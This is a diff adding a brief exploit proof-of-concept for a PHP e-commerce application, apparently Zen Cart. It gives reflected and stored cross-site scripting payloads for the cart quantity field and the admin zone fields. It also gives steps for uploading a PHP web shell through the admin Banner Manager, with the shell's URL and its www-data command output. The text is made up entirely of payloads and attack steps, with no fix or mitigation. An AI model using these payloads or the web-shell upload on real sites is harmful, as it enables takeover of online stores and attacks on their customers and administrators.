@@ -1,0 +1,28 @@
+REFLECTED CROSS-SITE SCRIPTING (XSS)
+
+http://[host]/index.php?main_page=shopping_cart (OR)
+ 
+   Your Shopping Cart Contents =&gt;
+ 
+   Qty: &quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+ 
+STORED CROSS-SITE SCRIPTING (XSS)
+
+http://[host]/[admin]/zones.php?page=1&amp;action=new (OR)
+ 
+   Locations/Taxes =&gt; Zones
+    
+   Zones Name: &quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+   Zones Code: &quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+
+ARBITRARY FILE UPLOAD
+
+http://[host]/[admin]/banner_manager.php?action=new (OR)
+ 
+   Tools =&gt; Banner Manager =&gt; New Banner =&gt; Image: phpShell.php
+ 
+   The uploaded file will be located into:
+ 
+    http://[host]/images/phpShell.php
+ 
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
